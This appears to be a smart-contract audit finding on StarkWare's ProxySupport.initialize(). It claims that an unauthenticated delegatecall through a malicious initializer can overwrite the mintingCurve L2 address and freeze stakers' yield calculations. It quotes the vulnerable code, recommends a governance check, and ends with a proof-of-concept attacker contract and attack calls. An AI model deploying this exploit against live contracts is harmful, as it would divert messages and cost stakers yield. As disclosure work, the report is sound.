### Title
Unauthenticated EIC Delegatecall Overwrites `mintingCurve` L2 Address, Silencing `totalSupply` Updates — (`L1/starkware/solidity/interfaces/ProxySupport.sol`)

---

### Summary

`ProxySupport.initialize()` carries no caller-authentication modifier. When an EIC address is supplied, the `isInitialized()` re-entrancy guard is skipped entirely. A malicious EIC executed via `delegatecall` runs in the proxy's storage context and can overwrite the `L2_MINTING_CURVE_TAG` slot with an attacker-controlled L2 address. After the overwrite, every `tick()` call sends `totalSupply` updates to the attacker's address; the legitimate `MintingCurve` contract receives none, causing it to permanently underestimate `total_supply` and underpay yield to all stakers.

---

### Finding Description

**Step 1 — No caller gate on `initialize()`**

`ProxySupport.initialize()` is decorated only with `notCalledDirectly`:

```solidity
function initialize(bytes calldata data) external notCalledDirectly {
``` [1](#0-0) 

`notCalledDirectly` checks `this_ != address(this)` — `this_` is the implementation address set at construction time. When the call arrives through the proxy (delegatecall), `address(this)` is the proxy address, so the check passes for **any** external caller. There is no `onlyGovernance`, `onlyUpgradeGovernor`, or any role check. [2](#0-1) 

**Step 2 — EIC path bypasses `isInitialized()`**

```solidity
if (eicAddress != address(0x0)) {
    callExternalInitializer(eicAddress, initData);
    return;          // ← isInitialized() check never reached
}
if (isInitialized()) { ... }
``` [3](#0-2) 

Supplying any non-zero EIC address causes the function to return immediately after the delegatecall, skipping the guard that would otherwise block re-initialization.

**Step 3 — `callExternalInitializer` delegatecalls attacker-controlled code in proxy storage context**

```solidity
(bool success, bytes memory returndata) = externalInitializerAddr.delegatecall(
    abi.encodeWithSelector(this.initialize.selector, eicData)
);
require(success, string(returndata));
require(returndata.length == 0, string(returndata));
``` [4](#0-3) 

The malicious EIC's `initialize(bytes)` executes with `address(this)` = proxy. It can compute `keccak256("REWARD_SUPPLIER_L2_MINTING_CURVE_SLOT_TAG")` and `sstore` an attacker-controlled L2 address directly, bypassing `setUintValueOnce`.

**Step 4 — `setMintingCurve` uses `setUintValueOnce`, but the malicious EIC bypasses it**

The legitimate setter:
```solidity
function setMintingCurve(uint256 mintingCurve_) internal {
    NamedStorage.setUintValueOnce(L2_MINTING_CURVE_TAG, mintingCurve_);
}
``` [5](#0-4) 

`setUintValueOnce` reverts if the slot is already set. However, the malicious EIC does not call this function — it uses inline assembly `sstore` directly to the computed slot, which has no such guard. [6](#0-5) 

**Step 5 — `tick()` now routes `totalSupply` updates to the attacker's L2 address**

```solidity
messagingContract().sendMessageToL2{value: msgFee}(
    mintingCurve(),          // ← now returns attacker's address
    UPDATE_TOTAL_SUPPLY_SELECTOR,
    messagePayload
);
``` [7](#0-6) 

The legitimate `MintingCurve` L2 contract receives no further `update_total_supply` L1 handler calls. Its `total_supply` storage stagnates at the last value written before the attack.

**Step 6 — Stale `total_supply` causes `yearly_mint` to underestimate yield**

```rust
fn yearly_mint(self: @ContractState) -> Amount {
    let total_supply = self.total_supply.read();   // stale after attack
    ...
    self.compute_yearly_mint(total_stake: ..., :total_supply)
}
``` [8](#0-7) 

```rust
fn compute_yearly_mint(...) -> Amount {
    let stake_times_supply: u256 = total_stake.wide_mul(total_supply);
    self.c_num.read().into() * stake_times_supply.sqrt() / C_DENOM.into()
}
``` [9](#0-8) 

Because `total_supply` is frozen at a pre-attack value while the actual token supply grows with each mint, `yearly_mint` returns a progressively smaller value than correct, causing all stakers and delegators to receive less yield than they are owed.

---

### Impact Explanation

Every `tick()` call after the attack sends the `totalSupply` message to the wrong L2 address. The legitimate `MintingCurve` never updates its `total_supply`. Since `yearly_mint = C * sqrt(total_stake * total_supply)`, a frozen (underestimated) `total_supply` permanently reduces the computed mint amount. All stakers and delegators receive less yield than entitled — constituting ongoing theft of unclaimed yield.

---

### Likelihood Explanation

The attack requires no privileged role, no leaked key, and no third-party compromise. Any EOA can:
1. Deploy a malicious EIC contract (one `sstore` in assembly).
2. Call `proxy.initialize(abi.encode(eicAddress, initData))` with the malicious EIC address.

The only cost is gas and the L1 message fee. The attack is executable in a single transaction.

---

### Recommendation

Add a caller-authentication check to `ProxySupport.initialize()` that enforces governance or upgrade-governor authorization before processing any EIC path:

```solidity
function initialize(bytes calldata data) external notCalledDirectly {
    require(_isGovernor(msg.sender) || isUpgradeGovernor(msg.sender), "ONLY_GOVERNANCE");
    ...
}
```

Alternatively, enforce `isInitialized()` even when an EIC is provided, or restrict EIC usage to the upgrade flow which is already gated by `onlyUpgradeGovernor`.

### Proof of Concept

```solidity
// Malicious EIC
contract MaliciousEIC {
    function initialize(bytes calldata) external {
        bytes32 slot = keccak256("REWARD_SUPPLIER_L2_MINTING_CURVE_SLOT_TAG");
        uint256 attackerL2Addr = 0xDEAD; // attacker-controlled L2 address
        assembly { sstore(slot, attackerL2Addr) }
    }
}

// Attack
MaliciousEIC eic = new MaliciousEIC();
// numOfSubContracts() == 0 for RewardSupplier (via ProxySupportImpl)
bytes memory data = abi.encode(address(eic)); // eicOffset=0, eicAddress=eic
IRewardSupplierProxy(proxy).initialize(data);

// Verify: mintingCurve() now returns 0xDEAD
assert(RewardSupplier(proxy).mintingCurve() == 0xDEAD);

// After tick(), sendMessageToL2 is called with 0xDEAD as destination.
// Legitimate MintingCurve receives no update_total_supply messages.
// yearly_mint() diverges downward from correct value.
```
